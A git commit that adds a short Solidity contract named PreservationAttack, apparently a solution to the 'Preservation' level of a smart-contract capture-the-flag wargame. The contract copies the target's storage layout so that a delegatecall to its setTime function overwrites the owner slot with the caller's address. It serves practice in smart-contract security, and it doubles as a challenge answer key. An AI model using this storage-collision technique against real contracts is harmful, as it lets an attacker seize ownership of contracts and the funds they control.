0cf5a933753b500aa45475815340892cfe38f963
Asamartino <a.samartino@protonmail.com>
2020-04-09 09:40:49 +0200

    Create Level_16_Preservation.sol

---
+++ Level_16_Preservation.sol
@@ -0,0 +1,13 @@
+pragma solidity ^0.6.5;
+
+
+contract PreservationAttack {
+   
+    address slot0;
+    address slot1;
+    address slot2;
+   
+ function setTime(uint _time) public {
+    slot2 = msg.sender;
+  }
+}
